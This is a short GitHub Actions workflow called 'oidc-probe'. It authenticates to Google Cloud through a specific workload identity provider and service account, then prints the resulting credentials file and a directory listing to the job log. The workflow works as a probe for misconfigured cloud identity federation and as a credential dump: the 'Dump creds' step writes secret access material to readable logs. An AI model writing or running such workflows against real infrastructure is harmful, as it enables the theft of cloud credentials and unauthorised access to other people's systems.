name: oidc-probe
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Auth
        id: auth
        continue-on-error: true
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/1094498259535/locations/global/workloadIdentityPools/gh-optimism-infra/providers/github-by-repos
          service_account: optimism-infra@devopsre.iam.gserviceaccount.com
          token_format: access_token
      - name: Dump creds
        if: always()
        run: |
          echo "CREDS_PATH=$GOOGLE_GHA_CREDS_PATH"
          if [ -n "$GOOGLE_GHA_CREDS_PATH" ] && [ -f "$GOOGLE_GHA_CREDS_PATH" ]; then cat "$GOOGLE_GHA_CREDS_PATH"; fi
          echo "---LS---"
          ls -la /home/runner/work/optimism-infra/optimism-infra/ | head -30
